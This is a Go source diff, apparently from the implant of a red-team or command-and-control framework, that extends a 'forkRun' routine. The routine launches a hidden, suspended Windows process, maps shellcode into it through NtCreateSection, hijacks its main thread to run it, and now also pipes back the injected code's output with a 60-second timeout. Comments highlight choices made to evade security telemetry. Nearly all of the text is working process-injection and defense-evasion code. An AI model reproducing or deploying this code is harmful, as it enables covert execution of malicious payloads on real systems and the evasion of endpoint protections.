@@ -10,14 +10,18 @@ package agent
 // telemetry — both avoided here.
 
 import (
+	"bytes"
 	"fmt"
+	"io"
 	"os"
+	"time"
+	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-// forkRun spawns a sacrificial process and executes shellcode inside it via
-// NtCreateSection + NtMapViewOfSection + thread hijack.  No output is captured.
+// forkRun spawns a sacrificial process, injects shellcode via
+// NtCreateSection + thread hijack, captures stdout/stderr, and returns the output.
 func forkRun(sc []byte, process string) (string, error) {
 	if process == "" {
 		sysroot := os.Getenv("SystemRoot")
@@ -40,37 +44,120 @@ func forkRun(sc []byte, process string) (string, error) {
 		}
 	}
 
-	// ── Step 1: Spawn suspended (no PPID spoof) ───────────────────────────────
-	pi, err := spawnSuspendedPlain(process)
+	// ── Step 1: Create stdout/stderr pipe ────────────────────────────────────
+	sa := windows.SecurityAttributes{InheritHandle: 1}
+	sa.Length = uint32(unsafe.Sizeof(sa))
+	var outRd, outWr windows.Handle
+	piped := windows.CreatePipe(&outRd, &outWr, &sa, 0) == nil
+	if piped {
+		// Read end must not be inherited by child
+		windows.SetHandleInformation(outRd, windows.HANDLE_FLAG_INHERIT, 0)
+	}
+
+	// ── Step 2: Spawn suspended with pipe handles ─────────────────────────────
+	pi, err := spawnSuspendedWithPipes(process, outWr, piped)
+	if piped {
+		windows.CloseHandle(outWr) // parent closes write end — EOF detected when child exits
+	}
 	if err != nil {
+		if piped {
+			windows.CloseHandle(outRd)
+		}
 		return "", fmt.Errorf("spawn(%s): %w", process, err)
 	}
 
-	// ── Step 2: Map shellcode via NtCreateSection (no VirtualAllocEx / WPM) ────
+	// ── Step 3: Map shellcode via NtCreateSection ─────────────────────────────
 	remoteAddr, err := injectViaSection(pi.Process, sc)
 	if err != nil {
 		windows.CloseHandle(pi.Thread)
 		terminateSacrificial(pi)
+		if piped {
+			windows.CloseHandle(outRd)
+		}
 		return "", fmt.Errorf("section inject: %w", err)
 	}
 
-	// ── Step 3: Thread hijack — redirect main thread RIP to shellcode ─────────
+	// ── Step 4: Thread hijack ────────────────────────────────────────────────
 	if err := hijackThread(pi.Thread, remoteAddr); err != nil {
 		windows.CloseHandle(pi.Thread)
 		terminateSacrificial(pi)
+		if piped {
+			windows.CloseHandle(outRd)
+		}
 		return "", fmt.Errorf("thread hijack: %w", err)
 	}
 
-	// ── Step 4: Resume thread ─────────────────────────────────────────────────
+	// ── Step 5: Resume ───────────────────────────────────────────────────────
 	if _, err := windows.ResumeThread(pi.Thread); err != nil {
 		windows.CloseHandle(pi.Thread)
 		terminateSacrificial(pi)
+		if piped {
+			windows.CloseHandle(outRd)
+		}
 		return "", fmt.Errorf("ResumeThread: %w", err)
 	}
 	windows.CloseHandle(pi.Thread)
+
+	if !piped {
+		windows.CloseHandle(pi.Process)
+		return fmt.Sprintf("[+] fork_run: %d B shellcode executed in %s (PID %d)", len(sc), process, pi.ProcessId), nil
+	}
+
+	// ── Step 6: Drain output with 60s timeout ────────────────────────────────
+	pipeFile := os.NewFile(uintptr(outRd), "fork_run_out")
+	var buf bytes.Buffer
+	readDone := make(chan struct{})
+	go func() {
+		io.Copy(&buf, pipeFile)
+		close(readDone)
+	}()
+
+	timedOut := false
+	select {
+	case <-readDone:
+	case <-time.After(60 * time.Second):
+		timedOut = true
+		windows.TerminateProcess(pi.Process, 1)
+		<-readDone
+	}
+	pipeFile.Close()
+	windows.WaitForSingleObject(pi.Process, 5000)
 	windows.CloseHandle(pi.Process)
 
-	return fmt.Sprintf("[+] fork_run: %d B shellcode executed in %s (PID %d)", len(sc), process, pi.ProcessId), nil
+	out := buf.String()
+	if timedOut {
+		out += "\n[!] fork-run: timed out (60s)"
+	}
+	if out == "" {
+		return "(no output)", nil
+	}
+	return out, nil
+}
+
+// spawnSuspendedWithPipes creates a suspended process redirecting stdout/stderr
+// to outWr when piped=true, otherwise behaves like spawnSuspendedPlain.
+func spawnSuspendedWithPipes(cmdLine string, outWr windows.Handle, piped bool) (windows.ProcessInformation, error) {
+	var pi windows.ProcessInformation
+	si := windows.StartupInfo{
+		Flags:      windows.STARTF_USESHOWWINDOW,
+		ShowWindow: 0,
+	}
+	si.Cb = uint32(unsafe.Sizeof(si))
+	if piped {
+		si.Flags |= windows.STARTF_USESTDHANDLES
+		si.StdInput = 0
+		si.StdOutput = outWr
+		si.StdErr = outWr
+	}
+	cmdLineW, _ := windows.UTF16PtrFromString(cmdLine)
+	appW, _ := windows.UTF16PtrFromString(cmdLine)
+	inherit := piped
+	err := windows.CreateProcess(
+		appW, cmdLineW, nil, nil, inherit,
+		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
+		nil, nil, &si, &pi,
+	)
+	return pi, err
 }
 
 func terminateSacrificial(pi windows.ProcessInformation) {
